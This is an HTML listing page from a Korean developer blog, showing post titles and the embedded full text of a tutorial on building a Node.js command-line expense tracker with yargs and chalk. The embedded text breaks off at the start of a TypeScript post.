<!DOCTYPE html><html lang="ko"><head><meta charSet="utf-8"/><title>allround-coder</title><meta name="description" content="I develop websites, games and apps with HTML, CSS and JS."/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta property="og:url" content="https://allround-coder.github.io///posts/94" data-gatsby-head="true"/><meta property="og:type" content="website" data-gatsby-head="true"/><meta property="og:site_name" content="allround-coder" data-gatsby-head="true"/><meta property="og:title" content="allround-coder" data-gatsby-head="true"/><meta property="og:description" content="I develop websites, games and apps with HTML, CSS and JS." data-gatsby-head="true"/><meta property="og:image" content="/favicons/ms-icon-310x310.png" data-gatsby-head="true"/><meta property="og:locale" content="en_US" data-gatsby-head="true"/><meta name="twitter:card" content="summary_large_image" data-gatsby-head="true"/><meta property="twitter:domain" content="https://allround-coder.github.io/" data-gatsby-head="true"/><meta property="twitter:url" content="https://allround-coder.github.io///posts/94" data-gatsby-head="true"/><meta name="twitter:title" content="allround-coder" data-gatsby-head="true"/><meta name="twitter:description" content="I develop websites, games and apps with HTML, CSS and JS." data-gatsby-head="true"/><meta name="twitter:image" content="/favicons/ms-icon-310x310.png" data-gatsby-head="true"/><meta name="twitter:data1" content="Dev | allround-coder" data-gatsby-head="true"/><meta name="next-head-count" content="18"/><meta name="google-site-verification" content="a-yehRo3k3xv7fg6LqRaE8jlE42e5wP2bDE_2F849O4"/><link rel="stylesheet" href="/favicons/favicon.ico"/><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png"/><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="96x96" href="/assets/favicons/favicon-96x96.png"/><link rel="icon" href="/favicons/apple-icon-180x180.png"/><link rel="apple-touch-icon" href="/favicons/apple-icon-180x180.png"/><link rel="apple-touch-startup-image" href="/startup.png"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"/><meta name="msapplication-config" content="/favicons/browserconfig.xml"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-ZFDEQ947R4"></script><script>window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
  
            gtag('config', 'G-ZFDEQ947R4');</script><link rel="preload" href="/_next/static/css/6e57edcf9f2ce551.css" as="style"/><link rel="stylesheet" href="/_next/static/css/6e57edcf9f2ce551.css" data-n-g=""/><link rel="preload" href="/_next/static/css/a22d13b8e6bc8203.css" as="style"/><link rel="stylesheet" href="/_next/static/css/a22d13b8e6bc8203.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-ee6df16fdc6dae4d.js" defer=""></script><script src="/_next/static/chunks/framework-46611630e39cfdeb.js" defer=""></script><script src="/_next/static/chunks/main-cf4a52eec9a970a0.js" defer=""></script><script src="/_next/static/chunks/pages/_app-6fae11262ee5c69b.js" defer=""></script><script src="/_next/static/chunks/75fc9c18-ac4aa08aae62f90e.js" defer=""></script><script src="/_next/static/chunks/463-0429087d4c0b0335.js" defer=""></script><script src="/_next/static/chunks/873-ec7535a55e788b31.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bpage%5D-cd321dee6458c228.js" defer=""></script><script src="/_next/static/t9N7vwmpvBMQnO2PSctoH/_buildManifest.js" defer=""></script><script src="/_next/static/t9N7vwmpvBMQnO2PSctoH/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="posts_container__s9Z_H posts_-list__bsl0U"><header class="Header_header__Z8PUO"><div class="Header_inner__tfr0u"><strong class="Header_title__Otn70"><a href="/">Allround Coder</a></strong><nav class="Header_nav_area__6KVpk"><a class="nav_item" href="/posts/1">Posts</a></nav></div></header><div class="posts_inner__HIBjT"><article><h2 class="SectionTitle_section_title__HS_xr">Posts</h2><div class="posts_project_list__oDV_y"><div class="PostList_post_list__or0rl"><a class="PostList_post_item__gAdVi" aria-label="Nodejs를 사용하여 지출 추적기를 만드는 방법" href="/post/2024-05-15-AnapproachtobuildanExpenseTrackerusingNodejs"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="Nodejs를 사용하여 지출 추적기를 만드는 방법" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-AnapproachtobuildanExpenseTrackerusingNodejs_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="Nodejs를 사용하여 지출 추적기를 만드는 방법" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">Nodejs를 사용하여 지출 추적기를 만드는 방법</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">8<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="TypeScript에서 타입 복잡성을 줄이는 3가지 명쾌한 단계" href="/post/2024-05-15-HowIReduceTypeComplexityinTypeScriptwith3Clear-cutSteps"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="TypeScript에서 타입 복잡성을 줄이는 3가지 명쾌한 단계" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-HowIReduceTypeComplexityinTypeScriptwith3Clear-cutSteps_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="TypeScript에서 타입 복잡성을 줄이는 3가지 명쾌한 단계" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">TypeScript에서 타입 복잡성을 줄이는 3가지 명쾌한 단계</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">1<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="JNDI Injection - 전체 이야기" href="/post/2024-05-15-JNDIInjectionTheCompleteStory"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="JNDI Injection - 전체 이야기" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="JNDI Injection - 전체 이야기" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">JNDI Injection - 전체 이야기</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">8<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="자체제작 스파이 군사 작전에서 YOLOv8 객체 검출 활용하기" href="/post/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="자체제작 스파이 군사 작전에서 YOLOv8 객체 검출 활용하기" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="자체제작 스파이 군사 작전에서 YOLOv8 객체 검출 활용하기" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">자체제작 스파이 군사 작전에서 YOLOv8 객체 검출 활용하기</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">8<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="아두이노와 iOS 간의 블루투스 연결" href="/post/2024-05-15-BluetoothconnectionbetweenArduinoandiOS"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="아두이노와 iOS 간의 블루투스 연결" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-BluetoothconnectionbetweenArduinoandiOS_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="아두이노와 iOS 간의 블루투스 연결" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">아두이노와 iOS 간의 블루투스 연결</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">14<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="2D 스캐닝 방법 개요" href="/post/2024-05-15-AnOverviewofKey2DScanningMethods"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="2D 스캐닝 방법 개요" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-AnOverviewofKey2DScanningMethods_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="2D 스캐닝 방법 개요" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">2D 스캐닝 방법 개요</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">5<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="내 멍청한 주전자를 축하하며" href="/post/2024-05-15-InCelebrationofMyDumbKettle"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="내 멍청한 주전자를 축하하며" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-InCelebrationofMyDumbKettle_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="내 멍청한 주전자를 축하하며" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">내 멍청한 주전자를 축하하며</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">7<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="사물인터넷IoT의 미래 성장에 인공 지능이 미칠 영향은 무엇일까요" href="/post/2024-05-15-iotWhatimpactwillartificialintelligencehaveonthefuturegrowthoftheInternetofThings"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="사물인터넷IoT의 미래 성장에 인공 지능이 미칠 영향은 무엇일까요" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-iotWhatimpactwillartificialintelligencehaveonthefuturegrowthoftheInternetofThings_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="사물인터넷IoT의 미래 성장에 인공 지능이 미칠 영향은 무엇일까요" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">사물인터넷IoT의 미래 성장에 인공 지능이 미칠 영향은 무엇일까요</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">2<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="글 제목 오픈AI GPT-4o를 사용하여 데이터베이스를 쿼리하는 방법" href="/post/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="글 제목 오픈AI GPT-4o를 사용하여 데이터베이스를 쿼리하는 방법" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="글 제목 오픈AI GPT-4o를 사용하여 데이터베이스를 쿼리하는 방법" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">글 제목 오픈AI GPT-4o를 사용하여 데이터베이스를 쿼리하는 방법</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">5<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="SQL 마스터리 이 필수 기술로 데이터 엔지니어링 실력을 향상하세요" href="/post/2024-05-15-SQLMasteryElevateYourDataEngineeringGamewithTheseEssentialSkills"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="SQL 마스터리 이 필수 기술로 데이터 엔지니어링 실력을 향상하세요" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-SQLMasteryElevateYourDataEngineeringGamewithTheseEssentialSkills_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="SQL 마스터리 이 필수 기술로 데이터 엔지니어링 실력을 향상하세요" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">SQL 마스터리 이 필수 기술로 데이터 엔지니어링 실력을 향상하세요</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">2<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a></div></div></article><div class="posts_pagination__R_03T"><button type="button" class="page_button -prev">&lt;</button><a class="link" href="/posts/81">81</a><a class="link" href="/posts/82">82</a><a class="link" href="/posts/83">83</a><a class="link" href="/posts/84">84</a><a class="link" href="/posts/85">85</a><a class="link" href="/posts/86">86</a><a class="link" href="/posts/87">87</a><a class="link" href="/posts/88">88</a><a class="link" href="/posts/89">89</a><a class="link" href="/posts/90">90</a><a class="link" href="/posts/91">91</a><a class="link" href="/posts/92">92</a><a class="link" href="/posts/93">93</a><a class="link posts_-active__YVJEi" href="/posts/94">94</a><a class="link" href="/posts/95">95</a><a class="link" href="/posts/96">96</a><a class="link" href="/posts/97">97</a><a class="link" href="/posts/98">98</a><a class="link" href="/posts/99">99</a><a class="link" href="/posts/100">100</a><button type="button" class="page_button -prev">&gt;</button></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"posts":[{"title":"Nodejs를 사용하여 지출 추적기를 만드는 방법","description":"","date":"2024-05-15 10:08","slug":"2024-05-15-AnapproachtobuildanExpenseTrackerusingNodejs","content":"\n\n\u003cimg src=\"/assets/img/2024-05-15-AnapproachtobuildanExpenseTrackerusingNodejs_0.png\" /\u003e\n\n- 소개:\n\nNode.js를 배우면서 Node.js를 사용하여 지출 추적 애플리케이션을 만들었습니다. 이 포괄적인 가이드에서는 Node.js를 사용하여 처음부터 직접 지출 추적 앱을 구축하는 과정을 안내하겠습니다. 먼저 개발 환경을 설정하고 프로젝트 구조를 초기화하는 것부터 시작하여 지출 모델을 만들고 지출을 관리하기 위한 CRUD 작업을 구현하는 방법을 살펴볼 것입니다. CLI(명령줄 인터페이스)를 구축하여 사용자 상호 작용을 처리하고 파일 I/O 작업을 사용하여 데이터 지속성을 다루는 방법을 배울 수 있습니다.\n\n2. 개발 환경 설정 및 종속성 설치:\n\n\n\nNode.js 앱을 초기 설정할 때는 'npm init' 명령어를 사용하고 'yargs'와 'chalk' npm 패키지를 설치하세요.\n\n3. 명령줄 인터페이스 구축:\n\n'yargs.command()'를 사용하여 add-expense, list, search, remove, total, highest 및 average와 같은 다양한 명령어를 정의하세요. 각 명령어는 개별적인 기능을 제공합니다. 예를 들어, add-expense 명령은 제목, 카테고리 및 금액을 사용하여 비용을 추가합니다. 모든 명령어를 정의한 후에는 yargs.parse() 메서드를 호출하여 명령줄 인수를 구문 분석하고 해당 명령어 핸들러를 실행합니다. 각 명령어는 명령어가 호출될 때 실행될 핸들러 함수를 지정합니다. 이러한 핸들러 함수는 expenses.js 모듈에 정의된 해당 함수를 호출하는 역할을 합니다.\n\n```js\nyargs.command({\n    command: 'add-expense',\n    describe: '새 비용 추가',\n    builder : {\n        title: {\n            describe: '비용 설명/제목',\n            demandOption: true,\n            type: 'string'\n        },\n        category: {\n            describe: '비용 카테고리',\n            demandOption: true,\n            type: 'string'\n         },\n        amount: {\n            describe: '비용 금액',\n            demandOption: true,\n            type: 'number'  \n        }\n    },\n    handler(argv){\n        expenses.addExpense(argv.title, argv.category, argv.amount)\n    }\n})\n```\n\n\n\n위의 코드는 add-expense 명령을 정의하는데, 이 명령은 제목, 카테고리 및 금액을 추가해야 합니다. 이 인수들은 핸들러 함수를 통해 addExpense 함수로 전달되며, add-expense 명령을 호출할 때마다 실행됩니다. 비슷하게, 나는 목록, 검색, 제거, 총합, 최고값, 평균과 같은 다양한 명령들을 생성했습니다.\n\n4. 지출 관리 작업 (expenses.js)\n\n지출 추적기 CLI가 견고하고 신뢰할 수 있도록 하기 위해, 파일 입출력 작업을 이용한 데이터 영속성을 구현할 것입니다. 지출 데이터를 로컬에 저장할 JSON 파일을 만들어, 사용자들이 세션 간에 지출 내역에 접근할 수 있도록 합니다.\n\nA) add-expense: 이 함수는 CLI를 통해 제목, 카테고리 및 금액을 받아와서, 제목이 중복되지 않는 경우 JSON 파일에 추가합니다. 파일 입출력 작업을 사용합니다.\n\n\n\n```js\nconst addExpense = (title, category, amount) =\u003e {\n    const current_exp = loadExpenses();\n    const duplicateExpense = current_exp.find((exp) =\u003e exp.title === title);\n    if (!duplicateExpense) {\n        current_exp.push({\n            title: title,\n            category: category,\n            amount: amount\n        });\n        saveExpenses(current_exp);\n        console.log(chalk.green.inverse('새 경비가 성공적으로 추가되었습니다!'));\n    } else {\n        console.log(chalk.red.inverse('경비 제목이 이미 추가되었습니다! 다른 지출을 시도해보세요'));\n    }\n}\n```\n\nB) list: listExpenses 기능은 JSON 파일에 저장된 모든 경비를 검색하고 형식에 맞게 표시합니다.\n\n```js\nconst listExpenses = () =\u003e {\n    const expenses = loadExpenses();\n    console.log(chalk.blue.underline.bold('귀하의 지출 내역은 다음과 같습니다:'));\n    expenses.forEach((exp, idx) =\u003e {\n        console.log(`${idx + 1}. 제목: ${exp.title}, 카테고리: ${exp.category}, 금액: ${exp.amount}`);\n    });\n}\n```\n\nC) search: searchExpenses 기능은 CLI를 통해 카테고리를 입력받고 해당 카테고리에 속한 모든 지출을 나열합니다.\n\n\n\n\n```js\nconst searchExpenses = (category) =\u003e {\n    const expenses = loadExpenses();\n    const curr_categoryexp = expenses.filter(exp =\u003e exp.category === category);\n    if (curr_categoryexp.length\u003e0) {\n        console.log(chalk.blue.underline.bold(`Expenses by ${category} are:`));\n         curr_categoryexp.forEach((exp,idx)=\u003e{\n            console.log(`${idx+1}. Under ${exp.category} category we have expense titled ${exp.title} for amount ${exp.amount}`)\n    })\n    } else {\n        console.log(chalk.red.inverse(`No category named ${category} found`))\n    }\n}\n```\n\nD) remove: The removeExpenses function takes in a title via command line and removes that expense.\n\n```js\nconst removeExpense = (title) =\u003e {\n    const expenses = loadExpenses()\n    const expensesToKeep = expenses.filter((exp) =\u003e exp.title !== title)\n    if (expenses.length \u003e expensesToKeep.length) {\n        //console.log(expensesToKeep.length, expenses.length)\n        console.log(chalk.greenBright.inverse('Expense Removed!'))\n        saveExpenses(expensesToKeep)\n    } else {\n        console.log(chalk.redBright.inverse(`Expense titled ${title} not found!`))\n    }\n}\n```\n\nE) total: The calculateTotalExpenses function calculates the total amount spent\n```js\nconst calculateTotalExpenses = () =\u003e {\n    const expenses = loadExpenses();\n    let total = 0;\n    expenses.forEach(exp =\u003e {\n        total += exp.amount;\n    });\n    console.log(chalk.yellow.bold(`Total amount spent is: ${total}`));\n}\n```\n\n\n\n```js\nconst calculateTotalExpenses = () =\u003e {\n    const expenses = loadExpenses();\n    const total = expenses.reduce((acc, curr) =\u003e acc + curr.amount, 0);\n    console.log(chalk.cyan.bold(`총 비용: ${total}`));\n}\n```\n\nF) highest: getHighestExpensePerCategory 함수는 각 카테고리별로 소비된 최고 금액을 계산하고 표시합니다.\n\n```js\nconst getHighestExpensePerCategory = () =\u003e {\n    const expenses = loadExpenses();\n    const highest = {};\n    expenses.forEach(exp =\u003e {\n        if (!highest[exp.category] || exp.amount \u003e highest[exp.category]){\n            highest[exp.category] = exp.amount;\n        }\n    });\n    console.log(chalk.yellowBright.underline('카테고리별 최고 지출:'));\n    for (const [category, amount] of Object.entries(highest)){\n        console.log(`${category}: ${amount.toFixed(3)}`);\n    }\n}\n```\n\nG) average: getAverageExpenseByCategory 함수는 각 카테고리별로 평균 비용을 계산합니다.\n\n\n\n\n```js\nconst getAverageExpenseByCategory = () =\u003e {\n    const expenses = loadExpenses();\n    const categories = {} // category: {total,count}\n    expenses.forEach(exp =\u003e {\n        if(categories[exp.category]){\n            categories[exp.category].total += exp.amount;\n            categories[exp.category].count += 1;\n\n        }   else{  // for new expense\n            categories[exp.category] = {\n                total: exp.amount,\n                count: 1\n            }\n        }\n    })\n    console.log(chalk.yellow.underline('Average Expense by category:'))\n    for (const [category, data] of Object.entries(categories)) {\n        const average = data.total / data.count;\n        console.log(`${category} : ${average.toFixed(3)}`)\n    }\n}\n```\n\n5. 파일 입출력 작동 방식:\n\nsaveExpense() 함수가 호출될 때마다, 지출 객체를 JSON 문자열로 변환하고 이를 expenselist.json 파일에 저장합니다. JSON 문자열을 JavaScript 객체로 다시 변환하려면, 파일을 동기적으로 읽고 데이터를 문자열로 변환한 뒤, 배열 객체로 변환하기 위해 파싱해야 합니다.\n\n```js\n// 지출 객체를 JSON 문자열로 변환\nconst saveExpenses = (expense) =\u003e {\n    const dataJSON = JSON.stringify(expense)\n    fs.writeFileSync('expenselist.json', dataJSON)\n}\n```\n\n\n\n파일 작업에 대해 더 알아보려면 https://nodejs.org/api/fs.html을 방문해보세요.\n\n6. addExpense() 함수의 Flow Diagram:\n\n![Flow Diagram](/assets/img/2024-05-15-AnapproachtobuildanExpenseTrackerusingNodejs_1.png)\n\n위 다이어그램은 addExpense() 함수의 로직이 어떻게 작동하는지 이해하는 데 도움이 됩니다. 마찬가지로, 다른 함수들에 대한 다이어그램을 만들 수도 있습니다.\n\n\n\n7. 사용자 인터페이스, 명령 구문 분석기 및 백엔드 서버 간의 흐름\n\n응용 프로그램을 구축할 때 클라이언트 측과 서버 측 간의 통신이 어떻게 이루어지는지 이해하는 것이 중요합니다. UI와 백엔드 서버가 어떻게 연결되는지 이해하고자 아래에 명령 처리 방식을 보여주는 다이어그램을 만들었습니다.\n\n- 흐름 및 명령은 사용자 인터페이스에서 시작되어 사용자가 입력을 제공합니다.\n- 명령 구문 분석기는 입력을 구문 분석하여 명령을 식별하고 명령 실행 구성 요소로 전달합니다.\n- 명령 실행에 의해 백엔드 서버의 해당 기능이 트리거되어 요청된 작업을 수행합니다.\n- 작업이 완료되면 백엔드 서버가 응답을 보내며, 해당 응답은 사용자 인터페이스를 통해 사용자에게 표시되거나 전달됩니다.\n\n![다이어그램](/assets/img/2024-05-15-AnapproachtobuildanExpenseTrackerusingNodejs_2.png)\n\n\n\n8. 샘플 입력-출력:\n\n이 샘플 입력과 출력은 비용 추적기 응용 프로그램 내에서 각 명령이 작동하는 방식을 보여줍니다. 사용자들이 비용을 효과적으로 관리하고 분석할 수 있는 기능을 제공합니다. 만들어 둔 입력 및 관련 명령에 대한 통찰력을 얻기 위해 언제든지 `--help` 명령을 사용할 수 있습니다.\n\n![이미지](https://miro.medium.com/v2/resize:fit:1322/1*kroYcWIHG79M4MO9wqJWFA.gif)\n\n9. 결론:\n\n\n\nNode.js와 명령줄 인터페이스의 힘을 활용하여, 저희는 재정 관리를 간편화하고 소비 습관에 대한 소중한 통찰력을 제공하는 도구를 만들었어요. JavaScipt의 힘을 빌려 견고하고 효율적인 명령줄 응용 프로그램을 만들었습니다. 이 글을 통해 명령어 구문 분석, 파일 입출력 작업을 사용한 데이터 관리, 그리고 지출에 대한 통찰력을 추출하기 위한 계산의 복잡성에 대해 살펴보았어요.\n\n계속되는 학습과 코드의 끝없는 가능성에 건배해요!","ogImage":{"url":"/assets/img/2024-05-15-AnapproachtobuildanExpenseTrackerusingNodejs_0.png"},"coverImage":"/assets/img/2024-05-15-AnapproachtobuildanExpenseTrackerusingNodejs_0.png","tag":["Tech"],"readingTime":8},{"title":"TypeScript에서 타입 복잡성을 줄이는 3가지 명쾌한 단계","description":"","date":"2024-05-15 10:07","slug":"2024-05-15-HowIReduceTypeComplexityinTypeScriptwith3Clear-cutSteps","content":"\n\n해당되는 TypeScript 프로젝트가 